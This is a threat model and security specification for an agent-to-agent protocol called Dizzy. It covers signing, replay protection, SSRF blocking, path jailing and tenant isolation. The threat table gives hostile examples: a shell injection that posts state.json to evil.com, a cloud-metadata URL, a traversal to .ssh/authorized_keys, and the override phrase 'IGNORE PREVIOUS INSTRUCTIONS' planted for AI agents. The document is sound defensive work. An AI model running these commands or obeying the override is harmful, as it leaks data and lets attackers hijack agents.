# A2A Threat Model & Security Specification

Status: Public / Hosted Horizon Security Specification  
Authority: Architectural Security Doctrine  
Applies to: External Agent-to-Agent (A2A) Protocols, Ingress Gateways, and Egress Transport

---

## 1. Scope & Operational Context

Dizzy distinguishes strictly between **Local-First A2A Mailbox** (single-runtime, shared-secret, loopback-only) and **Public/Hosted A2A Networking** (cross-tenant, untrusted internet, cryptographic federation).

This threat model defines the non-negotiable security requirements for Dizzy before opening public A2A network listeners or dispatching external tasks.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        UNTRUSTED INTERNET                              │
│  External Agents • Malicious Bounties • Rogue Microservices • Spoofers │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                        [HARDENED EGRESS / INGRESS AIRLOCK]
                     • Ed25519 Mutual Authentication
                     • Strict Timestamp (±120s) & Nonce Cache
                     • Hardened DNS / Egress Proxy (SSRF Guard)
                                    │
┌───────────────────────────────────▼────────────────────────────────────┐
│                         DIZZY CONTROL PLANE                            │
│  • Memory Partitioning: Tenant-isolated SQLite WAL & vector pools       │
│  • Task Triage & EV Gate (bounty_hunter_engine.mjs)                    │
│  • Dialectical Council Arbitration (62-Model Roster)                   │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                     Sealed WorkOrderSpec & Runbooks
                                    │
┌───────────────────────────────────▼────────────────────────────────────┐
│                    SANDBOXED EXECUTION NODES                           │
│  • Docker (`--network none`, read-only root) / MicroVM (Firecracker)   │
│  • Ephemeral AST Patching & Test Verification                          │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Threat Taxonomy & Attack Vectors

| Threat ID | Threat Name | Severity | Vector Description |
| :--- | :--- | :---: | :--- |
| **T-A2A-01** | **Sender Impersonation / Sybil Attack** | **Critical** | Attacker crafts a message claiming to be an authorized peer (`fromAgent: "codex"`) to inject malicious tasks or exfiltrate state. |
| **T-A2A-02** | **Message Replay Attack** | **High** | Attacker intercepts a valid, signed message (e.g. `dizzy.bounty_task.v1`) and replays it to induce duplicate compute spending or state desynchronization. |
| **T-A2A-03** | **SSRF / Cloud Metadata Pivot** | **Critical** | Attacker embeds internal URLs (`http://169.254.169.254/latest/meta-data`, `http://10.0.0.1/admin`) in task repositories or webhooks, tricking the node into scanning private networks. |
| **T-A2A-04** | **Arbitrary Command / Shell Injection** | **Critical** | Attacker supplies malicious `test_command` strings containing shell operators (`npm test; curl evil.com -d @state.json`) or unescaped variables. |
| **T-A2A-05** | **Path Traversal & Filesystem Poisoning** | **High** | Attacker specifies relative traversal (`../../.ssh/authorized_keys`) or absolute paths in `target_files` to overwrite host system files. |
| **T-A2A-06** | **Multi-Tenant Memory Bleed** | **Critical** | RAG retrieval fails to partition tenant IDs, allowing an external task to retrieve confidential memory from `private_self` or another tenant. |
| **T-A2A-07** | **Prompt Injection via Task Payloads** | **Medium** | Attacker hides system prompt overrides (`"IGNORE PREVIOUS INSTRUCTIONS"`) inside issue descriptions or source code comments. |
| **T-A2A-08** | **Asymmetric Compute Denial of Service (DoS)** | **Medium** | Attacker floods the ingress with complex, negative-EV bounty tasks to exhaust token allowances and local GPU/CPU resources. |

---

## 3. Defense Mechanisms & Invariants

### 3.1. Cryptographic Identity & Public Registry (T-A2A-01)
* **Ed25519 Signatures:** Every external A2A message must be signed using Ed25519 over the canonical, deterministic JSON stringification of the payload.
* **Sender Public Key Registry:** Senders are validated against a local, operator-signed peer registry (`sender_registry.json`). Messages from unregistered public keys are discarded at Gate 0 without LLM invocation.
* **Key Rotation:** Keys have explicit expiration timestamps. Stale keys fail closed.

### 3.2. Replay Windows & Nonce Caching (T-A2A-02)
* **Sliding Freshness Window:** Messages must include a Unix millisecond timestamp. Messages with timestamps outside `[now - 120s, now + 30s]` are rejected immediately.
* **Nonce Deduplication Cache:** Every message carries a cryptographically random UUID v4 nonce. Nonces are cached in an in-memory/Redis LRU filter for $2\times$ the freshness window (240s). Duplicate nonces are logged as replay attempts and dropped.

### 3.3. Hardened Egress Proxy & SSRF Neutralization (T-A2A-03)
* **Zero Ambient Egress:** Execution nodes operate with `--network none` by default.
* **Strict Domain Allowlists:** When external fetching is required (e.g., repository checkout in `job_board_scanner.mjs`), outgoing HTTP requests must route through an egress filter enforcing `ALLOWED_BOUNTY_DOMAINS` (`github.com`, `gitlab.com`).
* **Blocked IP Ranges:** Egress resolver strictly blocks loopback (`127.0.0.0/8`, `::1`), private RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), and AWS/GCP metadata endpoints (`169.254.169.254`).

### 3.4. Jailed Artifact Paths & Exact Command Matching (T-A2A-04, T-A2A-05)
* **Path Jailing:** `sanitizeArtifactPath()` asserts relative workspace paths only, rejecting `..`, leading slashes, backslashes, null bytes, and environment variable markers (`$`, `%`).
* **Exact Command Allowlist:** `sanitizeVerificationCommand()` rejects shell metacharacters (`|`, `&`, `;`, `$`, `<`, `>`, `` ` ``). Commands must match `ALLOWED_VERIFICATION_COMMANDS` 1:1.

### 3.5. Multi-Tenant Memory Isolation (T-A2A-06)
* **Cryptographic Partition Key:** Memory stores (SQLite WAL, vector indexes, cognitive wiki) enforce mandatory `tenant_id` and `trust_zone` clauses on every query.
* **Zero Cross-Tenant Leakage:** `private_self` topics and files are barred from RAG indexing when processing tasks originating from `outside_contact` or `paid_public`.

### 3.6. Janitor Sanitization & Economic EV Triage (T-A2A-07, T-A2A-08)
* **Deterministic Text Scrubbing:** `sanitizeBountyText()` strips known prompt injection patterns and shell escape codes before text enters any prompt or runbook.
* **EV Filter:** `calculateBountyEv()` evaluates $EV = P(\text{solve}) \times \text{payout} - \text{compute\_cost}$. Negative or sub-threshold EV tasks are rejected at intake before dispatching expensive models.

---

## 4. Operational Checklist Before Public Launch

- [x] Strict domain allowlists enforced in Node.js ingress (`lib/bounty_hunter_engine.mjs`).
- [x] Artifact path traversal jailing implemented (`sanitizeArtifactPath`).
- [x] Shell metacharacter command injection neutralized (`sanitizeVerificationCommand`).
- [x] Signed local A2A ingress route implemented (`lib/a2a_boundary_guard.mjs`).
- [ ] Ed25519 asymmetric signature adapter deployed (replaces shared-secret HMAC for public federated peers).
- [ ] Distributed Redis-backed nonce cache deployed for multi-instance scaling.
- [ ] Hardened egress proxy container deployed to wrap external git fetch operations.
